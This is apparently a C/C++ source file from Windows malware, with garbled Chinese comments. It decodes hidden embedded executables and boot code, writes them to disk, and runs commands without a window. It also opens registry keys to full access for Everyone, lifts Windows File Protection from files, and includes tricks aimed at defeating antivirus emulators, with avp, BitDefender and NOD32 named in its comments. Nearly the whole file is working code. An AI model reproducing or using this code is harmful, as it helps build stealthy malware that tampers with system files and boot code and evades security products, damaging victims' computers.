////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "Common.h"

//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//
extern	char	*g_szSYSCSKey;
//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
void	CmpNameAndRecordId(PROCESSENTRY32 *pPE32);
BOOL	BuildFile(char *szFilePath, char *pFileByte, DWORD dwFileSize, BOOL bIsFileProtect);
//--------------------------------------------------------------------------//

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//������� 155�ֽ�����
BOOL Decode(char *pInput, DWORD	dwInputSize, DWORD dwRendomVal)
{
	DWORD	*pDword = NULL, *pLast = NULL, dwAlign = 0;


	//�Ƿ� 4�ֽ� ����?
	dwAlign = dwInputSize % sizeof(DWORD);
	if(dwAlign != 0)
	{
		return FALSE;
	}
	pLast = ( (DWORD*)(pInput + dwInputSize) ) - 1;
	pDword = (DWORD*)pInput;
	while(true)
	{
		DWORD	dwCurrentVal = 0, dwMoveBit = 0, dwRO = 0;


		dwMoveBit = ( (DWORD)pDword - (DWORD)pInput ) & 0x0000001F; //ʣ�µ� 5λ
		dwRO = dwMoveBit & 0x04;
		dwCurrentVal = *pDword;
		if(dwRO < 1)	//ѭ������
		{
			__asm
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROL		dword ptr [dwCurrentVal], cl;
				pop		ecx;
			}
		}
		else			//ѭ������
		{
			__asm
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROR		dword ptr [dwCurrentVal], cl;
				pop		ecx;
			}
		}
		*pDword = (~(dwCurrentVal ^ dwRendomVal) ) + dwRendomVal + *(pDword + 1);
		
		pDword ++;
		if( pDword >= pLast)	//��������һ��ֵ
		{
			DWORD	dwLastVal = 0;

			dwLastVal = *pDword + dwRendomVal;
			dwMoveBit = ( (DWORD)pDword - (DWORD)pInput ) & 0x0000001F; //ʣ�µ� 5λ
			__asm	//ѭ������
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROL		dword ptr [dwLastVal], cl;
				pop		ecx;
			}
			*pDword = (~dwLastVal) ^ dwRendomVal;
			break;
		}
	}

	return TRUE;
}

//���ݵ�ǰϵͳʱ��Ϊ����,����һ�������
DWORD GetRandomVal()
{
	DWORD		dwResult = 0;
	FILETIME	FileTime;


	GetSystemTimeAsFileTime( &FileTime );

	srand( FileTime.dwLowDateTime & 0xFFFF );
	dwResult = (DWORD)rand() << 16;
		
	srand( FileTime.dwLowDateTime & 0xFFFF0000 );
	dwResult = dwResult | (DWORD)rand();

	return	dwResult;
}

//ö�ٽ���, ����һЩ����
DWORD ProcessEnumAndOperate(char *pInBuffer, DWORD dwBufferSize, DWORD dwFlag)
{
	DWORD			dwResult = 0;
	HANDLE			hProcessSnap = INVALID_HANDLE_VALUE;
	PROCESSENTRY32	pe32;


	memset(&pe32, 0, sizeof(pe32));
	pe32.dwSize = sizeof(pe32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(hProcessSnap, &pe32);

	do
	{
		if(dwFlag == 1)
		{
			CmpNameAndRecordId( &pe32 );
		}
		else if(dwFlag == 4)
		{
			if(lstrcmpi(pe32.szExeFile, pInBuffer) == 0)
			{
				dwResult = pe32.th32ProcessID;
				break;
			}
		}

	}while( Process32Next(hProcessSnap, &pe32) );
	CloseHandle( hProcessSnap );

	return dwResult;
}

//�ͷ���Դ���ļ����ڴ�
BOOL Reresource(HMODULE hModule, int iReID, char *pFilePath, char *pMem, DWORD *pdwReSize)
{
	BOOL	bStatus = TRUE;
	HRSRC	hResource = NULL;
	HGLOBAL pLoad = NULL;
	char	*pCurMem = NULL;
	DWORD	dwSize = 0;


	hResource = FindResource(hModule, MAKEINTRESOURCE( iReID ), "FILE");
	dwSize = SizeofResource(hModule, hResource);
	pLoad = LoadResource(hModule, hResource);
	if(dwSize == 0 || pLoad == NULL)
	{
		bStatus = FALSE;
		goto __END;
	}
	LockResource( pLoad );

	if(pdwReSize != NULL)
	{
		*pdwReSize = dwSize;
	}

	if(pMem != NULL)
	{
		pCurMem = pMem;
	}
	else
	{
		pCurMem = (char*)VirtualAlloc(NULL, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if(pCurMem == NULL)
		{
			bStatus = FALSE;
			goto __END;
		}
	}

	memcpy(pCurMem, pLoad, dwSize);
//MessageBox( NULL, "333333", "a", 0 );
	Decode(pCurMem + sizeof(DWORD), (dwSize - sizeof(DWORD)), *(DWORD*)pCurMem);	//ע��, �����н������
//MessageBox( NULL, "444444", "a", 0 );
	if(iReID == FILE_BOOTCODE)
	{
		*(DWORD*)pCurMem = 0x8EC031FA;//��ͷָ���� cli; xor ax,ax; mov ss,ax;
	}
	else
	{
		*(DWORD*)pCurMem = 0x00905A4D;//�ָ�'MZ'
	}

	if(pFilePath != NULL)
	{
		bStatus = BuildFile(pFilePath, pCurMem, dwSize, FALSE);
	}

	if(pMem == NULL && pCurMem != NULL)
	{
		VirtualFree(pCurMem, 0, MEM_RELEASE);
	}


__END:
	if(pLoad != NULL)
	{
		FreeResource( pLoad );
	}
//MessageBox( NULL, "555555", "a", 0 );

	return bStatus;
}

//��ȡ�ں�ģ��Ļ�ַ��ģ������
PVOID GetModuleBase(__out char *szModuleName, __in DWORD dwFlag)
{
typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct {
	DWORD    dwNumberOfModules;
	SYSTEM_MODULE_INFORMATION    smi;
} MODULES, *PMODULES;

typedef	NTSTATUS (NTAPI *DEF_ZwQuerySystemInformation)(
    ULONG	SystemInformationClass,
    PVOID	SystemInformation,
    ULONG	SystemInformationLength,
    PULONG	ReturnLength
);

	PVOID	pModuleBase = NULL;
	DWORD	dwSize = 0; 
	MODULES	*pModule = NULL;

	DEF_ZwQuerySystemInformation	PROZwQuerySystemInformation = NULL;

	
	PROZwQuerySystemInformation = (DEF_ZwQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll"), "ZwQuerySystemInformation");
	PROZwQuerySystemInformation(11, &pModule, sizeof(DWORD), &dwSize);	//#define STATUS_INFO_LENGTH_MISMATCH		((NTSTATUS)0xC0000004L)
	if(dwSize != 0)
	{
		pModule = (MODULES*)new char[dwSize];
		if(pModule == NULL)
		{
			return	NULL;
		}
	}
	else
	{
		return	NULL;
	}
	PROZwQuerySystemInformation(11, pModule, dwSize, NULL);
	
	if(dwFlag == 1)
	{
		SYSTEM_MODULE_INFORMATION		*pMove = NULL;

		pMove = &pModule->smi;
		for(DWORD i = 0; i < pModule->dwNumberOfModules; i++)
		{
			if( lstrcmpi(szModuleName, (pMove->ImageName + pMove->ModuleNameOffset) ) == 0 )
			{
				pModuleBase = pMove->Base;
				break;
			}

			pMove ++;
		}
	}
	else if(dwFlag == 0)
	{
		//ϵͳ�ں�ģ�� �����ڵ� 1 ��
		pModuleBase = pModule->smi.Base;
		lstrcpy(szModuleName, (pModule->smi.ImageName + pModule->smi.ModuleNameOffset) );
	}

	delete pModule;

	return	pModuleBase;
}

//ִ������, ��Ҫ�ȴ��ӽ���ִ�����, ���Բ�����WinExec
BOOL ExcuteCommand(char *szCommand, DWORD dwWaitTime, DWORD *pdwExitCode, DWORD *pdwProId)
{
	BOOL				bResult = FALSE;
	PROCESS_INFORMATION	pi;
	STARTUPINFO			si;


	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	bResult = CreateProcess(NULL, szCommand, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE|CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if(bResult == TRUE)
	{
		CloseHandle( pi.hThread );
		if(dwWaitTime > 0)
		{
			WaitForSingleObject(pi.hProcess, dwWaitTime);
		}
		if(pdwProId != NULL)
		{
			*pdwProId = pi.dwProcessId;
		}
		if(pdwExitCode != NULL)
		{
			GetExitCodeProcess(pi.hProcess, pdwExitCode);
		}
		CloseHandle( pi.hProcess );
	}

	return bResult;
}

//����ע������ķ���Ȩ��
BOOL MotifyKeyAccess(char *szKeyName)
{
	char					szKey[1024];
	PACL					pOldDacl=NULL, pNewDacl=NULL;
	EXPLICIT_ACCESS			eia;
	PSECURITY_DESCRIPTOR	pSID=NULL;


	//ͷ������ MACHINE
	memset(szKey, 0, sizeof(szKey));
	wsprintf(szKey, "MACHINE\\%s", szKeyName);

	//��ȡDACL
	if( GetNamedSecurityInfo(szKey, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, &pSID) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	//����һ��ACE,����Everyone���Ա��ȫ���ƶ���,�������Ӷ���̳д�Ȩ��
	memset(&eia, 0, sizeof(EXPLICIT_ACCESS));
	BuildExplicitAccessWithName(&eia, "Everyone", KEY_ALL_ACCESS, SET_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);

	// ���µ�ACE����DACL 
	if( SetEntriesInAcl(1, &eia, pOldDacl, &pNewDacl) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	// ����SAM������DACL 
	if( SetNamedSecurityInfo(szKey, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,NULL, NULL, pNewDacl, NULL) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	//�ͷ�DACL��SID
	if(pNewDacl != NULL)
	{
		LocalFree( pNewDacl );
	}
	if(pSID != NULL)
	{
		LocalFree( pSID );
	}

	return TRUE;
}

//�� ... ��Ȩ
BOOL EnablePrivilege(char *szPrivilege)
{
	BOOL	bStatus = FALSE;
	LUID	DestLuid;

	if(LookupPrivilegeValue(NULL, szPrivilege, &DestLuid) == TRUE)
	{
		HANDLE	hProcess = NULL, hToken = NULL;
		

		hProcess = GetCurrentProcess();
		OpenProcessToken(hProcess, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken);
		if(hToken != NULL)
		{
			TOKEN_PRIVILEGES	TokenPrilivege;

			
			TokenPrilivege.PrivilegeCount = 1;
			TokenPrilivege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			TokenPrilivege.Privileges[0].Luid = DestLuid;
			if(AdjustTokenPrivileges(hToken, FALSE, &TokenPrilivege, sizeof(TokenPrilivege), NULL, 0) == TRUE)
			{
				bStatus = TRUE;
			}
			CloseHandle( hToken );
		}
		CloseHandle( hProcess );
	}

	return bStatus;
}

//���ļ����ڴ�, ������ڴ��ɵ������ͷ�
BOOL ReadFileInMem(char *pFilePath, char **pFileByteParam, DWORD *dwFileSizeParam)
{
	BOOL				bStatus = FALSE;
	char				*pFileByte = NULL;
	HANDLE				hFile = INVALID_HANDLE_VALUE;
	DWORD				dwFileSize = 0, dwByte = 0, dwTotalRead = 0, dwCurrentRead = 0;


	if(PathFileExists( pFilePath ) == FALSE)
	{
		goto __END;
	}

	for(int i = 0; i < 50; i++)
	{
		hFile = CreateFile(pFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			break;
		}
		Sleep( 100 );
	}

	dwFileSize = GetFileSize(hFile, NULL);
	if(dwFileSize == 0 || dwFileSize == INVALID_FILE_SIZE)
	{
		goto __END;
	}

	pFileByte = (char*)VirtualAlloc(NULL, dwFileSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if(pFileByte == NULL)
	{
		goto __END;
	}

	dwCurrentRead = dwFileSize;
	while(dwTotalRead < dwFileSize)
	{
		if( ReadFile(hFile, pFileByte, dwCurrentRead, &dwByte, NULL) == FALSE )
		{
			goto __END;
		}

		dwTotalRead = dwTotalRead + dwByte;
		dwCurrentRead = dwFileSize - dwTotalRead;
	}

	bStatus = TRUE;

__END:
	if(hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle( hFile );
	}

	if(bStatus == FALSE)
	{
		if(pFileByte != NULL)
		{
			VirtualFree(pFileByte, 0, MEM_RELEASE);
		}
		
		*pFileByteParam = NULL;
		*dwFileSizeParam = 0;
	}
	else
	{
		*pFileByteParam = pFileByte;
		*dwFileSizeParam = dwFileSize;
	}

	return bStatus;
}

//��һ���ļ���windows�ļ��������޳�
void UnProtectFile(char *pFilePath)
{
	typedef	DWORD (__stdcall *DEF_SfcFileException)(
		int		iFlag,
		wchar_t	*pwFilePath,
		int		iUnknow
		);

	wchar_t					wFilePath[MAX_PATH];
	HMODULE					hsfc_os = NULL;
	DEF_SfcFileException	PROSfcFileException = NULL;


	//�ļ�·����Ҫת��Ϊ Unicode
	memset(wFilePath, 0, sizeof(wFilePath));
	MultiByteToWideChar(CP_ACP, 0, pFilePath, -1, wFilePath, sizeof(wFilePath) / 2);

	//�ҵ����� sfc_os!SfcFileException
	hsfc_os = LoadLibrary( "sfc_os.dll" );
	PROSfcFileException = (DEF_SfcFileException)GetProcAddress(hsfc_os, "SfcFileException");
	if(PROSfcFileException == NULL)
	{
		PROSfcFileException = (DEF_SfcFileException)GetProcAddress(hsfc_os, (LPCTSTR)5);
		if(PROSfcFileException == NULL)
		{
			goto __END;
		}
	}

	//ִ��: ���ļ��� Exception, �ӱ������ų�
	PROSfcFileException(0, wFilePath, -1);

__END:
	if(hsfc_os != NULL)
	{
		FreeLibrary( hsfc_os );
	}

	return;
}

//��д�򴴽��ļ�
BOOL BuildFile(char *szFilePath, char *pFileByte, DWORD dwFileSize, BOOL bIsFileProtect)
{
	BOOL	bFileExist = FALSE;
	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	dwByte = 0;


	bFileExist = PathFileExists( szFilePath );
	if(bFileExist == TRUE && bIsFileProtect == TRUE)
	{
		UnProtectFile( szFilePath );
	}

	hFile = CreateFile(szFilePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if( WriteFile(hFile, pFileByte, dwFileSize, &dwByte, NULL) == FALSE )
	{
		CloseHandle( hFile );
		if(bFileExist == FALSE)
		{
			DeleteFile( szFilePath );
		}
		return	FALSE;
	}
	SetFilePointer(hFile, dwFileSize, 0, FILE_BEGIN);
	SetEndOfFile( hFile );
	CloseHandle( hFile );

	return	TRUE;
}

//ֻ�� nop
void PassVM()
{
	DWORD	dwSize = 0x04000000;	//avp: 0x04000000		BitDefender: 0x00A00000
	char	*pReAddr = NULL, *pCode = NULL;


__try
{
	pCode = (char*)VirtualAlloc(NULL, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(pCode == NULL)
	{
		return;
	}
	memset(pCode, 0x90, dwSize);
	__asm
	{
		mov		eax, __READDR;
		mov		pReAddr, eax;
	}
	*((DWORD*)(pCode + dwSize - 5)) = 0x000000E9;
	*((DWORD*)(pCode + dwSize - 4)) = pReAddr - (pCode + dwSize);
	__asm
	{
		mov		eax, pCode;
		jmp		eax;
	}
__READDR:
	VirtualFree(pCode, 0, MEM_RELEASE);
}
__except( EXCEPTION_EXECUTE_HANDLER )
{
	return;
}

	return;
}

//�˺���Ϊ��VMProtect
DWORD JustVMProtect(char *pData, DWORD dwFlag)
{
	void	IsExe(DWORD dwFlags);
	BOOL	IsDll();

	DWORD	dwResult = 0;



	//��һЩ����ɱ���������,����NOD32
	__try
	{
		__asm
		{
			jmp	dword ptr [dwResult];
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		__asm
		{
			nop;
		}
	}

	if(dwFlag == 1)
	{
		IsExe( 0 );
	}
	else if(dwFlag == 2)
	{
		dwResult = (DWORD)IsDll();
	}

	return dwResult;
}